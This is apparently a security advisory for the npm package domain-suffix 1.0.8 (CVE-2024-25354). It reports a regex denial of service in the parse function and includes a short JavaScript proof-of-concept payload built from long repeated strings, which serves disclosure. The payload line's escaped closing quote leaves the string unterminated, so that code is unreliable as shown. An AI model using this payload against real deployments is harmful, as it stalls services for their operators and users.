|  | Product: https://www.npmjs.com/package/domain-suffix |
| --- | --- |
|  | Version: 1.0.8 |
|  | Vulnerability type: Denial of Service |
|  | CVE ID: CVE-2024-25354 |
|  |  |
|  | The regex defined on line 28. inside https://github.com/ikrong/domain-suffix/blob/master/src/domainSuffix.ts |
|  | is vulnerable to Regex Denial of Service. When a long string is provided to the application without specifying "/" character |
|  | the function parse will be stuck for indefinite amount of time, in this case 10 seconds, but this can be |
|  | amplified if more characters are added. |
|  | PoC code: |
|  |  |
|  | const DomainSuffix = require("domain-suffix").domainSuffix; |
|  | console.time('[ + ] Time passed -> '); |
|  |  |
|  | var payload = "aA".repeat(95500) + '/Aa\'; |
|  | let result = DomainSuffix.parse("https://" + payload) |
|  | if(result){ |
|  | let {suffix,domain} = result; |
|  | console.log(suffix,domain); |
|  | }else{ |
|  | console.log("cannot parse"); |
|  | } |
|  |  |
|  | console.timeEnd('[ + ] Time passed -> '); |
